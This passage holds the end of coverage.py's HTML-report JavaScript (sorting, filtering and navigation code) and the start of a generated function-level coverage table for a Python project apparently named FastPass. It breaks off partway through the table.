        return valueA - valueB;
    }
    return valueA.localeCompare(valueB, undefined, {numeric: true});
}

function sortColumn(th) {
    // Get the current sorting direction of the selected header,
    // clear state on other headers and then set the new sorting direction.
    const currentSortOrder = th.getAttribute("aria-sort");
    [...th.parentElement.cells].forEach(header => header.setAttribute("aria-sort", "none"));
    var direction;
    if (currentSortOrder === "none") {
        direction = th.dataset.defaultSortOrder || "ascending";
    }
    else if (currentSortOrder === "ascending") {
        direction = "descending";
    }
    else {
        direction = "ascending";
    }
    th.setAttribute("aria-sort", direction);

    const column = [...th.parentElement.cells].indexOf(th)

    // Sort all rows and afterwards append them in order to move them in the DOM.
    Array.from(th.closest("table").querySelectorAll("tbody tr"))
        .sort((rowA, rowB) => rowComparator(rowA, rowB, column) * (direction === "ascending" ? 1 : -1))
        .forEach(tr => tr.parentElement.appendChild(tr));

    // Save the sort order for next time.
    if (th.id !== "region") {
        let th_id = "file";  // Sort by file if we don't have a column id
        let current_direction = direction;
        const stored_list = localStorage.getItem(coverage.INDEX_SORT_STORAGE);
        if (stored_list) {
            ({th_id, direction} = JSON.parse(stored_list))
        }
        localStorage.setItem(coverage.INDEX_SORT_STORAGE, JSON.stringify({
            "th_id": th.id,
            "direction": current_direction
        }));
        if (th.id !== th_id || document.getElementById("region")) {
            // Sort column has changed, unset sorting by function or class.
            localStorage.setItem(coverage.SORTED_BY_REGION, JSON.stringify({
                "by_region": false,
                "region_direction": current_direction
            }));
        }
    }
    else {
        // Sort column has changed to by function or class, remember that.
        localStorage.setItem(coverage.SORTED_BY_REGION, JSON.stringify({
            "by_region": true,
            "region_direction": direction
        }));
    }
}

// Find all the elements with data-shortcut attribute, and use them to assign a shortcut key.
coverage.assign_shortkeys = function () {
    document.querySelectorAll("[data-shortcut]").forEach(element => {
        document.addEventListener("keypress", event => {
            if (event.target.tagName.toLowerCase() === "input") {
                return; // ignore keypress from search filter
            }
            if (event.key === element.dataset.shortcut) {
                element.click();
            }
        });
    });
};

// Create the events for the filter box.
coverage.wire_up_filter = function () {
    // Populate the filter and hide100 inputs if there are saved values for them.
    const saved_filter_value = localStorage.getItem(coverage.FILTER_STORAGE);
    if (saved_filter_value) {
        document.getElementById("filter").value = saved_filter_value;
    }
    const saved_hide100_value = localStorage.getItem(coverage.HIDE100_STORAGE);
    if (saved_hide100_value) {
        document.getElementById("hide100").checked = JSON.parse(saved_hide100_value);
    }

    // Cache elements.
    const table = document.querySelector("table.index");
    const table_body_rows = table.querySelectorAll("tbody tr");
    const no_rows = document.getElementById("no_rows");

    // Observe filter keyevents.
    const filter_handler = (event => {
        // Keep running total of each metric, first index contains number of shown rows
        const totals = new Array(table.rows[0].cells.length).fill(0);
        // Accumulate the percentage as fraction
        totals[totals.length - 1] = { "numer": 0, "denom": 0 };  // nosemgrep: eslint.detect-object-injection

        var text = document.getElementById("filter").value;
        // Store filter value
        localStorage.setItem(coverage.FILTER_STORAGE, text);
        const casefold = (text === text.toLowerCase());
        const hide100 = document.getElementById("hide100").checked;
        // Store hide value.
        localStorage.setItem(coverage.HIDE100_STORAGE, JSON.stringify(hide100));

        // Hide / show elements.
        table_body_rows.forEach(row => {
            var show = false;
            // Check the text filter.
            for (let column = 0; column < totals.length; column++) {
                cell = row.cells[column];
                if (cell.classList.contains("name")) {
                    var celltext = cell.textContent;
                    if (casefold) {
                        celltext = celltext.toLowerCase();
                    }
                    if (celltext.includes(text)) {
                        show = true;
                    }
                }
            }

            // Check the "hide covered" filter.
            if (show && hide100) {
                const [numer, denom] = row.cells[row.cells.length - 1].dataset.ratio.split(" ");
                show = (numer !== denom);
            }

            if (!show) {
                // hide
                row.classList.add("hidden");
                return;
            }

            // show
            row.classList.remove("hidden");
            totals[0]++;

            for (let column = 0; column < totals.length; column++) {
                // Accumulate dynamic totals
                cell = row.cells[column]  // nosemgrep: eslint.detect-object-injection
                if (cell.classList.contains("name")) {
                    continue;
                }
                if (column === totals.length - 1) {
                    // Last column contains percentage
                    const [numer, denom] = cell.dataset.ratio.split(" ");
                    totals[column]["numer"] += parseInt(numer, 10);  // nosemgrep: eslint.detect-object-injection
                    totals[column]["denom"] += parseInt(denom, 10);  // nosemgrep: eslint.detect-object-injection
                }
                else {
                    totals[column] += parseInt(cell.textContent, 10);  // nosemgrep: eslint.detect-object-injection
                }
            }
        });

        // Show placeholder if no rows will be displayed.
        if (!totals[0]) {
            // Show placeholder, hide table.
            no_rows.style.display = "block";
            table.style.display = "none";
            return;
        }

        // Hide placeholder, show table.
        no_rows.style.display = null;
        table.style.display = null;

        const footer = table.tFoot.rows[0];
        // Calculate new dynamic sum values based on visible rows.
        for (let column = 0; column < totals.length; column++) {
            // Get footer cell element.
            const cell = footer.cells[column];  // nosemgrep: eslint.detect-object-injection
            if (cell.classList.contains("name")) {
                continue;
            }

            // Set value into dynamic footer cell element.
            if (column === totals.length - 1) {
                // Percentage column uses the numerator and denominator,
                // and adapts to the number of decimal places.
                const match = /\.([0-9]+)/.exec(cell.textContent);
                const places = match ? match[1].length : 0;
                const { numer, denom } = totals[column];  // nosemgrep: eslint.detect-object-injection
                cell.dataset.ratio = `${numer} ${denom}`;
                // Check denom to prevent NaN if filtered files contain no statements
                cell.textContent = denom
                    ? `${(numer * 100 / denom).toFixed(places)}%`
                    : `${(100).toFixed(places)}%`;
            }
            else {
                cell.textContent = totals[column];  // nosemgrep: eslint.detect-object-injection
            }
        }
    });

    document.getElementById("filter").addEventListener("input", debounce(filter_handler));
    document.getElementById("hide100").addEventListener("input", debounce(filter_handler));

    // Trigger change event on setup, to force filter on page refresh
    // (filter value may still be present).
    document.getElementById("filter").dispatchEvent(new Event("input"));
    document.getElementById("hide100").dispatchEvent(new Event("input"));
};
coverage.FILTER_STORAGE = "COVERAGE_FILTER_VALUE";
coverage.HIDE100_STORAGE = "COVERAGE_HIDE100_VALUE";

// Set up the click-to-sort columns.
coverage.wire_up_sorting = function () {
    document.querySelectorAll("[data-sortable] th[aria-sort]").forEach(
        th => th.addEventListener("click", e => sortColumn(e.target))
    );

    // Look for a localStorage item containing previous sort settings:
    let th_id = "file", direction = "ascending";
    const stored_list = localStorage.getItem(coverage.INDEX_SORT_STORAGE);
    if (stored_list) {
        ({th_id, direction} = JSON.parse(stored_list));
    }
    let by_region = false, region_direction = "ascending";
    const sorted_by_region = localStorage.getItem(coverage.SORTED_BY_REGION);
    if (sorted_by_region) {
        ({
            by_region,
            region_direction
        } = JSON.parse(sorted_by_region));
    }

    const region_id = "region";
    if (by_region && document.getElementById(region_id)) {
        direction = region_direction;
    }
    // If we are in a page that has a column with id of "region", sort on
    // it if the last sort was by function or class.
    let th;
    if (document.getElementById(region_id)) {
        th = document.getElementById(by_region ? region_id : th_id);
    }
    else {
        th = document.getElementById(th_id);
    }
    th.setAttribute("aria-sort", direction === "ascending" ? "descending" : "ascending");
    th.click()
};

coverage.INDEX_SORT_STORAGE = "COVERAGE_INDEX_SORT_2";
coverage.SORTED_BY_REGION = "COVERAGE_SORT_REGION";

// Loaded on index.html
coverage.index_ready = function () {
    coverage.assign_shortkeys();
    coverage.wire_up_filter();
    coverage.wire_up_sorting();

    on_click(".button_prev_file", coverage.to_prev_file);
    on_click(".button_next_file", coverage.to_next_file);

    on_click(".button_show_hide_help", coverage.show_hide_help);
};

// -- pyfile stuff --

coverage.LINE_FILTERS_STORAGE = "COVERAGE_LINE_FILTERS";

coverage.pyfile_ready = function () {
    // If we're directed to a particular line number, highlight the line.
    var frag = location.hash;
    if (frag.length > 2 && frag[1] === "t") {
        document.querySelector(frag).closest(".n").classList.add("highlight");
        coverage.set_sel(parseInt(frag.substr(2), 10));
    }
    else {
        coverage.set_sel(0);
    }

    on_click(".button_toggle_run", coverage.toggle_lines);
    on_click(".button_toggle_mis", coverage.toggle_lines);
    on_click(".button_toggle_exc", coverage.toggle_lines);
    on_click(".button_toggle_par", coverage.toggle_lines);

    on_click(".button_next_chunk", coverage.to_next_chunk_nicely);
    on_click(".button_prev_chunk", coverage.to_prev_chunk_nicely);
    on_click(".button_top_of_page", coverage.to_top);
    on_click(".button_first_chunk", coverage.to_first_chunk);

    on_click(".button_prev_file", coverage.to_prev_file);
    on_click(".button_next_file", coverage.to_next_file);
    on_click(".button_to_index", coverage.to_index);

    on_click(".button_show_hide_help", coverage.show_hide_help);

    coverage.filters = undefined;
    try {
        coverage.filters = localStorage.getItem(coverage.LINE_FILTERS_STORAGE);
    } catch(err) {}

    if (coverage.filters) {
        coverage.filters = JSON.parse(coverage.filters);
    }
    else {
        coverage.filters = {run: false, exc: true, mis: true, par: true};
    }

    for (cls in coverage.filters) {
        coverage.set_line_visibilty(cls, coverage.filters[cls]);  // nosemgrep: eslint.detect-object-injection
    }

    coverage.assign_shortkeys();
    coverage.init_scroll_markers();
    coverage.wire_up_sticky_header();

    document.querySelectorAll("[id^=ctxs]").forEach(
        cbox => cbox.addEventListener("click", coverage.expand_contexts)
    );

    // Rebuild scroll markers when the window height changes.
    window.addEventListener("resize", coverage.build_scroll_markers);
};

coverage.toggle_lines = function (event) {
    const btn = event.target.closest("button");
    const category = btn.value
    const show = !btn.classList.contains("show_" + category);
    coverage.set_line_visibilty(category, show);
    coverage.build_scroll_markers();
    coverage.filters[category] = show;
    try {
        localStorage.setItem(coverage.LINE_FILTERS_STORAGE, JSON.stringify(coverage.filters));
    } catch(err) {}
};

coverage.set_line_visibilty = function (category, should_show) {
    const cls = "show_" + category;
    const btn = document.querySelector(".button_toggle_" + category);
    if (btn) {
        if (should_show) {
            document.querySelectorAll("#source ." + category).forEach(e => e.classList.add(cls));
            btn.classList.add(cls);
        }
        else {
            document.querySelectorAll("#source ." + category).forEach(e => e.classList.remove(cls));
            btn.classList.remove(cls);
        }
    }
};

// Return the nth line div.
coverage.line_elt = function (n) {
    return document.getElementById("t" + n)?.closest("p");
};

// Set the selection.  b and e are line numbers.
coverage.set_sel = function (b, e) {
    // The first line selected.
    coverage.sel_begin = b;
    // The next line not selected.
    coverage.sel_end = (e === undefined) ? b+1 : e;
};

coverage.to_top = function () {
    coverage.set_sel(0, 1);
    coverage.scroll_window(0);
};

coverage.to_first_chunk = function () {
    coverage.set_sel(0, 1);
    coverage.to_next_chunk();
};

coverage.to_prev_file = function () {
    window.location = document.getElementById("prevFileLink").href;
}

coverage.to_next_file = function () {
    window.location = document.getElementById("nextFileLink").href;
}

coverage.to_index = function () {
    location.href = document.getElementById("indexLink").href;
}

coverage.show_hide_help = function () {
    const helpCheck = document.getElementById("help_panel_state")
    helpCheck.checked = !helpCheck.checked;
}

// Return a string indicating what kind of chunk this line belongs to,
// or null if not a chunk.
coverage.chunk_indicator = function (line_elt) {
    const classes = line_elt?.className;
    if (!classes) {
        return null;
    }
    const match = classes.match(/\bshow_\w+\b/);
    if (!match) {
        return null;
    }
    return match[0];
};

coverage.to_next_chunk = function () {
    const c = coverage;

    // Find the start of the next colored chunk.
    var probe = c.sel_end;
    var chunk_indicator, probe_line;
    while (true) {
        probe_line = c.line_elt(probe);
        if (!probe_line) {
            return;
        }
        chunk_indicator = c.chunk_indicator(probe_line);
        if (chunk_indicator) {
            break;
        }
        probe++;
    }

    // There's a next chunk, `probe` points to it.
    var begin = probe;

    // Find the end of this chunk.
    var next_indicator = chunk_indicator;
    while (next_indicator === chunk_indicator) {
        probe++;
        probe_line = c.line_elt(probe);
        next_indicator = c.chunk_indicator(probe_line);
    }
    c.set_sel(begin, probe);
    c.show_selection();
};

coverage.to_prev_chunk = function () {
    const c = coverage;

    // Find the end of the prev colored chunk.
    var probe = c.sel_begin-1;
    var probe_line = c.line_elt(probe);
    if (!probe_line) {
        return;
    }
    var chunk_indicator = c.chunk_indicator(probe_line);
    while (probe > 1 && !chunk_indicator) {
        probe--;
        probe_line = c.line_elt(probe);
        if (!probe_line) {
            return;
        }
        chunk_indicator = c.chunk_indicator(probe_line);
    }

    // There's a prev chunk, `probe` points to its last line.
    var end = probe+1;

    // Find the beginning of this chunk.
    var prev_indicator = chunk_indicator;
    while (prev_indicator === chunk_indicator) {
        probe--;
        if (probe <= 0) {
            return;
        }
        probe_line = c.line_elt(probe);
        prev_indicator = c.chunk_indicator(probe_line);
    }
    c.set_sel(probe+1, end);
    c.show_selection();
};

// Returns 0, 1, or 2: how many of the two ends of the selection are on
// the screen right now?
coverage.selection_ends_on_screen = function () {
    if (coverage.sel_begin === 0) {
        return 0;
    }

    const begin = coverage.line_elt(coverage.sel_begin);
    const end = coverage.line_elt(coverage.sel_end-1);

    return (
        (checkVisible(begin) ? 1 : 0)
        + (checkVisible(end) ? 1 : 0)
    );
};

coverage.to_next_chunk_nicely = function () {
    if (coverage.selection_ends_on_screen() === 0) {
        // The selection is entirely off the screen:
        // Set the top line on the screen as selection.

        // This will select the top-left of the viewport
        // As this is most likely the span with the line number we take the parent
        const line = document.elementFromPoint(0, 0).parentElement;
        if (line.parentElement !== document.getElementById("source")) {
            // The element is not a source line but the header or similar
            coverage.select_line_or_chunk(1);
        }
        else {
            // We extract the line number from the id
            coverage.select_line_or_chunk(parseInt(line.id.substring(1), 10));
        }
    }
    coverage.to_next_chunk();
};

coverage.to_prev_chunk_nicely = function () {
    if (coverage.selection_ends_on_screen() === 0) {
        // The selection is entirely off the screen:
        // Set the lowest line on the screen as selection.

        // This will select the bottom-left of the viewport
        // As this is most likely the span with the line number we take the parent
        const line = document.elementFromPoint(document.documentElement.clientHeight-1, 0).parentElement;
        if (line.parentElement !== document.getElementById("source")) {
            // The element is not a source line but the header or similar
            coverage.select_line_or_chunk(coverage.lines_len);
        }
        else {
            // We extract the line number from the id
            coverage.select_line_or_chunk(parseInt(line.id.substring(1), 10));
        }
    }
    coverage.to_prev_chunk();
};

// Select line number lineno, or if it is in a colored chunk, select the
// entire chunk
coverage.select_line_or_chunk = function (lineno) {
    var c = coverage;
    var probe_line = c.line_elt(lineno);
    if (!probe_line) {
        return;
    }
    var the_indicator = c.chunk_indicator(probe_line);
    if (the_indicator) {
        // The line is in a highlighted chunk.
        // Search backward for the first line.
        var probe = lineno;
        var indicator = the_indicator;
        while (probe > 0 && indicator === the_indicator) {
            probe--;
            probe_line = c.line_elt(probe);
            if (!probe_line) {
                break;
            }
            indicator = c.chunk_indicator(probe_line);
        }
        var begin = probe + 1;

        // Search forward for the last line.
        probe = lineno;
        indicator = the_indicator;
        while (indicator === the_indicator) {
            probe++;
            probe_line = c.line_elt(probe);
            indicator = c.chunk_indicator(probe_line);
        }

        coverage.set_sel(begin, probe);
    }
    else {
        coverage.set_sel(lineno);
    }
};

coverage.show_selection = function () {
    // Highlight the lines in the chunk
    document.querySelectorAll("#source .highlight").forEach(e => e.classList.remove("highlight"));
    for (let probe = coverage.sel_begin; probe < coverage.sel_end; probe++) {
        coverage.line_elt(probe).querySelector(".n").classList.add("highlight");
    }

    coverage.scroll_to_selection();
};

coverage.scroll_to_selection = function () {
    // Scroll the page if the chunk isn't fully visible.
    if (coverage.selection_ends_on_screen() < 2) {
        const element = coverage.line_elt(coverage.sel_begin);
        coverage.scroll_window(element.offsetTop - 60);
    }
};

coverage.scroll_window = function (to_pos) {
    window.scroll({top: to_pos, behavior: "smooth"});
};

coverage.init_scroll_markers = function () {
    // Init some variables
    coverage.lines_len = document.querySelectorAll("#source > p").length;

    // Build html
    coverage.build_scroll_markers();
};

coverage.build_scroll_markers = function () {
    const temp_scroll_marker = document.getElementById("scroll_marker")
    if (temp_scroll_marker) temp_scroll_marker.remove();
    // Don't build markers if the window has no scroll bar.
    if (document.body.scrollHeight <= window.innerHeight) {
        return;
    }

    const marker_scale = window.innerHeight / document.body.scrollHeight;
    const line_height = Math.min(Math.max(3, window.innerHeight / coverage.lines_len), 10);

    let previous_line = -99, last_mark, last_top;

    const scroll_marker = document.createElement("div");
    scroll_marker.id = "scroll_marker";
    document.getElementById("source").querySelectorAll(
        "p.show_run, p.show_mis, p.show_exc, p.show_exc, p.show_par"
    ).forEach(element => {
        const line_top = Math.floor(element.offsetTop * marker_scale);
        const line_number = parseInt(element.querySelector(".n a").id.substr(1));

        if (line_number === previous_line + 1) {
            // If this solid missed block just make previous mark higher.
            last_mark.style.height = `${line_top + line_height - last_top}px`;
        }
        else {
            // Add colored line in scroll_marker block.
            last_mark = document.createElement("div");
            last_mark.id = `m${line_number}`;
            last_mark.classList.add("marker");
            last_mark.style.height = `${line_height}px`;
            last_mark.style.top = `${line_top}px`;
            scroll_marker.append(last_mark);
            last_top = line_top;
        }

        previous_line = line_number;
    });

    // Append last to prevent layout calculation
    document.body.append(scroll_marker);
};

coverage.wire_up_sticky_header = function () {
    const header = document.querySelector("header");
    const header_bottom = (
        header.querySelector(".content h2").getBoundingClientRect().top -
        header.getBoundingClientRect().top
    );

    function updateHeader() {
        if (window.scrollY > header_bottom) {
            header.classList.add("sticky");
        }
        else {
            header.classList.remove("sticky");
        }
    }

    window.addEventListener("scroll", updateHeader);
    updateHeader();
};

coverage.expand_contexts = function (e) {
    var ctxs = e.target.parentNode.querySelector(".ctxs");

    if (!ctxs.classList.contains("expanded")) {
        var ctxs_text = ctxs.textContent;
        var width = Number(ctxs_text[0]);
        ctxs.textContent = "";
        for (var i = 1; i < ctxs_text.length; i += width) {
            key = ctxs_text.substring(i, i + width).trim();
            ctxs.appendChild(document.createTextNode(contexts[key]));
            ctxs.appendChild(document.createElement("br"));
        }
        ctxs.classList.add("expanded");
    }
};

document.addEventListener("DOMContentLoaded", () => {
    if (document.body.classList.contains("indexfile")) {
        coverage.index_ready();
    }
    else {
        coverage.pyfile_ready();
    }
});
</file>

<file path="reports/coverage/function_index.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage report</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="indexfile">
<header>
    <div class="content">
        <h1>Coverage report:
            <span class="pc_cov">74%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>f</kbd>
                        <kbd>n</kbd>
                        <kbd>s</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        <kbd>c</kbd>
                        &nbsp; change column sorting
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <form id="filter_container">
            <input id="filter" type="text" value="" placeholder="filter...">
            <div>
                <input id="hide100" type="checkbox" >
                <label for="hide100">hide covered</label>
            </div>
        </form>
        <h2>
                <a class="button" href="index.html">Files</a>
                <a class="button current">Functions</a>
                <a class="button" href="class_index.html">Classes</a>
        </h2>
        <p class="text">
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</header>
<main id="index">
    <table class="index" data-sortable>
        <thead>
            <tr class="tablehead" title="Click to sort">
                <th id="file" class="name left" aria-sort="none" data-shortcut="f">File<span class="arrows"></span></th>
                <th id="region" class="name left" aria-sort="none" data-default-sort-order="ascending" data-shortcut="n">function<span class="arrows"></span></th>
                <th id="statements" aria-sort="none" data-default-sort-order="descending" data-shortcut="s">statements<span class="arrows"></span></th>
                <th id="missing" aria-sort="none" data-default-sort-order="descending" data-shortcut="m">missing<span class="arrows"></span></th>
                <th id="excluded" aria-sort="none" data-default-sort-order="descending" data-shortcut="x">excluded<span class="arrows"></span></th>
                <th id="coverage" class="right" aria-sort="none" data-shortcut="c">coverage<span class="arrows"></span></th>
            </tr>
        </thead>
        <tbody>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6___init___py.html">src\__init__.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6___init___py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6___main___py.html#t19">src\__main__.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6___main___py.html#t19"><data value='main'>main</data></a></td>
                <td>2</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="2 2">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6___main___py.html">src\__main__.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6___main___py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>9</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="9 9">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t24">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t24"><data value='init__'>FastPassApplication.__init__</data></a></td>
                <td>12</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="12 12">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t58">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t58"><data value='run'>FastPassApplication.run</data></a></td>
                <td>27</td>
                <td>9</td>
                <td>0</td>
                <td class="right" data-ratio="18 27">67%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t104">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t104"><data value='check_crypto_tools'>FastPassApplication._check_crypto_tools</data></a></td>
                <td>19</td>
                <td>7</td>
                <td>0</td>
                <td class="right" data-ratio="12 19">63%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t137">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t137"><data value='perform_security_and_file_validation'>FastPassApplication._perform_security_and_file_validation</data></a></td>
                <td>21</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="19 21">90%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t180">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t180"><data value='collect_files_recursively'>FastPassApplication._collect_files_recursively</data></a></td>
                <td>7</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="5 7">71%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t194">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t194"><data value='setup_crypto_tools_and_configuration'>FastPassApplication._setup_crypto_tools_and_configuration</data></a></td>
                <td>12</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="11 12">92%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t219">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t219"><data value='process_files_with_crypto_operations'>FastPassApplication._process_files_with_crypto_operations</data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t236">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t236"><data value='cleanup_and_generate_final_report'>FastPassApplication._cleanup_and_generate_final_report</data></a></td>
                <td>5</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="5 5">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t255">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t255"><data value='perform_cleanup'>FastPassApplication._perform_cleanup</data></a></td>
                <td>7</td>
                <td>6</td>
                <td>0</td>
                <td class="right" data-ratio="1 7">14%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t268">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t268"><data value='clear_sensitive_data'>FastPassApplication._clear_sensitive_data</data></a></td>
                <td>7</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="7 7">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t286">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t286"><data value='cleanup_partial_processing_on_failure'>FastPassApplication._cleanup_partial_processing_on_failure</data></a></td>
                <td>1</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="0 1">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t290">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t290"><data value='emergency_cleanup'>FastPassApplication._emergency_cleanup</data></a></td>
                <td>4</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="2 4">50%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>31</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="31 31">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t17">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t17"><data value='parse_command_line_arguments'>parse_command_line_arguments</data></a></td>
                <td>14</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="14 14">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t84">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t84"><data value='setup_common_arguments'>setup_common_arguments</data></a></td>
                <td>8</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="8 8">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t147">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t147"><data value='display_information_and_exit'>display_information_and_exit</data></a></td>
                <td>14</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="13 14">93%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t176">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t176"><data value='validate_arguments'>validate_arguments</data></a></td>
                <td>15</td>
                <td>3</td>
                <td>0</td>
                <td class="right" data-ratio="12 15">80%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t218">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t218"><data value='handle_stdin_passwords'>handle_stdin_passwords</data></a></td>
                <td>11</td>
                <td>10</td>
                <td>0</td>
                <td class="right" data-ratio="1 11">9%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t240">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html#t240"><data value='main'>main</data></a></td>
                <td>23</td>
                <td>4</td>
                <td>0</td>
                <td class="right" data-ratio="19 23">83%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>15</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="14 15">93%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41___init___py.html">src\core\__init__.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41___init___py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26___init___py.html">src\core\crypto_handlers\__init__.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26___init___py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t25">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t25"><data value='init__'>OfficeDocumentHandler.__init__</data></a></td>
                <td>6</td>
                <td>6</td>
                <td>0</td>
                <td class="right" data-ratio="0 6">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t37">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t37"><data value='configure'>OfficeDocumentHandler.configure</data></a></td>
                <td>3</td>
                <td>3</td>
                <td>0</td>
                <td class="right" data-ratio="0 3">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t51">src\core\crypto_handlers\office_handler.py</a></td>
